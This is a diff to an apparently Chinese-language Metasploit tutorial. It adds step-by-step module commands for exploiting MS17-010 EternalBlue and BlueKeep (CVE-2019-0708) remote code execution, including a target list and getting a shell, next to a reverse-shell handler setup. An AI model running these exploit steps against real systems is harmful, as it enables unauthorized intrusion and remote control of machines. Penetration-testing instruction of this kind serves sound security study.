@@ -24,7 +24,7 @@ Metasploit的设计初衷是打造成一个攻击工具开发平台，
 
 注意：`此次实验可以不用做内网映射直接进行攻击，我只是借着这个机会说一下内网映射。。。`
 
-### 场景分析 
+### 场景分析
 
 > `正向连接使用场景`：我们的攻击机在`内网环境`，被攻击机是`外网环境`，由于被攻击机无法主动连接到我们的主机，所以就`必须我们主动连接被攻击机`了。但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，`比如被攻击机只对外开放了80端口。`那么，我们就只能设置正向连接80端口了，这里很有可能失败，因为80端口上的流量太多了!
  
@@ -585,7 +585,13 @@ use auxiliary/admin/oracle/tnscmd   # 该漏洞可以远程获取到 oracle 的�
     use auxiliary/scanner/smb/smb_ms17_010
     set rhosts <ip>
     run
+
+    # 攻击目标机
+    use exploit/windows/smb/ms17_010_eternalblue
+    set rhosts <ip>
+    set lport 4444 <自己端口>
 ```
+
 
 
 **cve_2019_0708_bluekeep**
@@ -594,7 +600,29 @@ use auxiliary/admin/oracle/tnscmd   # 该漏洞可以远程获取到 oracle 的�
     use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
     set rhosts <ip>
     run
+
+    # 利用
+    use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+    set target <1-7>
+    set rhosts <ip>
+    show options
+    exploit
+    shell
+    python
+
+       Id  Name
+   --  ----
+   0   Automatic targeting via fingerprinting
+   1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
+   2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)
+   3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)
+   4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)
+   5   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)
+   6   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)
+   7   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)
+
 ```
+
 
 **Metasploit反弹shell**
 ```bash
@@ -604,3 +632,14 @@ set LHOST
 set LPORT
 exploit -j  # 后台执行
 ```
+
+
+
+
+
+
+
+
+
+
+
